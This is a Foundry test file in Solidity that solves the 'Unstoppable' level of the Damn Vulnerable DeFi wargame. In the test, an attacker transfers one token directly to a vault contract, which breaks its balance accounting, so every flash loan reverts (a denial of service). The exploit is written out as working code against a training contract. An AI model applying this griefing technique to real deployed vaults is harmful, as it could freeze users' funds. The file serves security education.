// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console } from "lib/forge-std/src/Test.sol";
import {UnstoppableVault} from "src/Unstoppable/UnstoppableVault.sol";
import {DamnValuableToken} from "src/DamnValuableToken.sol";
import {ERC20} from "lib/solmate/src/tokens/ERC20.sol";
import {ReceiverUnstoppable} from "src/Unstoppable/ReceiverUnstoppable.sol";

contract BreakUnstoppableVault is Test {
    uint256 constant VAULT_BALANCE = 100e18;
    uint256 constant ATTACKER_WALLET = 10e18;

    UnstoppableVault public vault;
    DamnValuableToken public token;
    ReceiverUnstoppable public taeContract;

    address attacker = makeAddr("Attacker");
    address owner = makeAddr("Owner");
    address feeRecipient = makeAddr("FeeRecipient");
    address tae = makeAddr("Tae");

    function setUp() public {
        vm.prank(tae);
        taeContract = new  ReceiverUnstoppable(address(vault));

        vm.startPrank(owner);
        token = new DamnValuableToken();
        vault = new UnstoppableVault( ERC20 (token),  owner, feeRecipient);

        token.approve(address(vault), VAULT_BALANCE );
        vault.deposit(VAULT_BALANCE, address(vault));

        token.approve(address(attacker), ATTACKER_WALLET);
        token.transfer(address(attacker), ATTACKER_WALLET);

        console.log("[Initial setup]");
        uint256 vaultBalance = token.balanceOf(address(vault));
        console.log("Vault balance :" , vaultBalance);

        console.log("[Attacker wallet balance]");
        uint256 attackerwallet = token.balanceOf(address(attacker));
        console.log("Attacker wallet :" , attackerwallet);
        vm.stopPrank();
    }    

    function testExploitUnstoppable() public {
        //Attacker sends 1DVT to the vault without the deposit function directly to the vault
        //The vaults balance is not equal to the totalsupply
        //Thus leads to reverting everytime tae calls the flashloan 🦖
        vm.startPrank(attacker);
        token.transfer(address(vault), 1);
        vm.stopPrank();

        vm.startPrank(tae);
        vm.expectRevert();
        taeContract.executeFlashLoan(10);
        vm.stopPrank();

        console.log("Congratulations you pass the test!!");
    }
}

